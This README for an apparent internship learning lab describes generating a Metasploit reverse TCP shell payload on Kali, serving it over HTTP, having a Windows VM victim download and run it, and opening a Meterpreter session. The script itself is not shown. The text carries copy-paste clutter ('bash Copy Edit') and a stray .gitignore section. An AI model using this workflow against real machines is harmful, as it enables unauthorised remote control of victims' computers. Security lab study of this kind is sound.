# Metasploit Reverse Shell Lab

This project demonstrates how to create a **reverse TCP shell** using the Metasploit Framework in a controlled lab environment (Kali Linux as attacker, Windows 10 as victim).

The automation is handled by a single script: `scripts/run_lab.sh`.

---

## 🛠️ Requirements

- Kali Linux (with Metasploit installed)
- Windows 10 VM (victim)
- VirtualBox or VMware
- Both machines on same LAN / Host-only network

---

## 📂 How to Use

### 1. Clone this repository

```bash
git clone https://github.com/<your-username>/metasploit-reverse-shell-lab.git
cd metasploit-reverse-shell-lab/scripts
2. Make script executable
bash
Copy
Edit
chmod +x run_lab.sh
3. Run the script
bash
Copy
Edit
./run_lab.sh <your-kali-ip> 4444
Example:
./run_lab.sh 192.168.1.50 4444

This will:

Generate a reverse shell payload (shell.exe)

Host it over HTTP at http://<ip>:8000/shell.exe

Start a Metasploit handler waiting for the connection

🪟 On the Windows Victim VM
Open a browser

Visit: http://<kali-ip>:8000/shell.exe

Download and run the file

🐚 If it works…
You'll see a Meterpreter session open in your Kali terminal:

bash
Copy
Edit
meterpreter > sysinfo
meterpreter > shell
⚠️ DISCLAIMER
This lab is for educational use only in a virtual environment. Do not use this on real systems or networks you don’t have permission to test.

📝 Credits
Made by Aarya as part of a cybersecurity learning project (ShadowFox Internship Lab – June 2025).

yaml
Copy
Edit

---

## ✅ 2. Optional `.gitignore` (optional but safe)

Create a `.gitignore` file with this content:

```bash
payloads/
*.exe
*.log
